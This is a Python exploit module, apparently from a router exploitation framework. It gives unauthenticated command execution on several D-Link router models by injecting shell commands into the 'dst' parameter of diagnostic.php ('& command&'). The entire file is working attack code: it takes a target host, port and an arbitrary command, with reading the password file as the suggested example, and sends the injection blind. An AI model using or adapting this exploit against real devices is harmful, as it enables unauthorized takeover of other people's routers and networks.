# Name:D-link DIR-815 and DIR-645 and others command execution no auth
# File:dir815_645_exec.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 17.07.2016
# Last modified: 18.07.2016
# Shodan Dork:
# Description: Command execution vulnerability for multiple D-link models listed below:
# DIR-815 v1.03b02
# DIR-645 v1.02 (unauthenticated command injection)
# DIR-645 v1.03 (authenticated command injection)
# DIR-600 below v2.16b01 (with v2.16b01 D-Link also fixes different vulnerabilities reported in M1ADV2013-003)
# DIR-300 revB v2.13b01 (unauthenticated command injection)
# DIR-300 revB v2.14b01 (authenticated command injection)
# DIR-412 Ver 1.14WWB02 (unauthenticated command injection)
# DIR-456U Ver 1.00ONG (unauthenticated command injection)
# DIR-110 Ver 1.01 (unauthenticated command injection)
# Based on: http://www.s3cur1ty.de/m1adv2013-017

import core.Exploit
import core.io

import requests
import interface.utils
from interface.messages import print_error, print_success, print_help, print_info, print_warning


class Exploit(core.Exploit.RextExploit):
    """
Name:D-link DIR-815 and DIR-645 and mothers command execution no auth
File:dir815_645_exec.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 17.07.2016
Description: Command execution vulnerability for multiple D-link models listed below:
DIR-815 v1.03b02
DIR-645 v1.02 (unauthenticated command injection)
DIR-645 v1.03 (authenticated command injection)
DIR-600 below v2.16b01
DIR-300 revB v2.13b01 (unauthenticated command injection)
DIR-300 revB v2.14b01 (authenticated command injection)
DIR-412 Ver 1.14WWB02 (unauthenticated command injection)
DIR-456U Ver 1.00ONG (unauthenticated command injection)
DIR-110 Ver 1.01 (unauthenticated command injection)
Based on: http://www.s3cur1ty.de/m1adv2013-017

Options:
    Name        Description

    host        Target host address
    port        Target port
    command     Command to execute e.g. cat var/passwd
    """
    command = ""

    def __init__(self):
        self.command = "ls"
        core.Exploit.RextExploit.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        try:
            if args[0] == "host":
                if interface.utils.validate_ipv4(args[1]):
                    self.host = args[1]
                else:
                    print_error("please provide valid IPv4 address")
            elif args[0] == "port":
                if str.isdigit(args[1]):
                    self.port = args[1]
                else:
                    print_error("port value must be integer")
            elif args[0] == "command":
                self.command = ' '.join(args[1:])
        except IndexError:
            print_error("please specify value for variable")

    def do_command(self, e):
        print_info(self.command)

    def help_command(self):
        print_help("Prints current value of command")

    def do_run(self, e):
        url = "http://%s:%s/diagnostic.php" % (self.host, self.port)

        payload = {'act': 'ping',
                   'dst': '& %s&' % self.command}
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language': 'Accept-Language: en-us,en;q=0.5',
                   'Accept-Encoding': 'gzip, deflate',
                   'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'
                   }
        try:
            print_warning("Sending exploit")
            response = requests.post(url, headers=headers, data=payload, timeout=60)
            if "<report>OK</report>" in response.text:
                print_success("output not available this is blind injection")
            else:
                print_error("could not find marker in response, exploit failed")
        except requests.Timeout:
            print_error("timeout")
        except requests.ConnectionError:
            print_error("exploit failed")
Exploit()
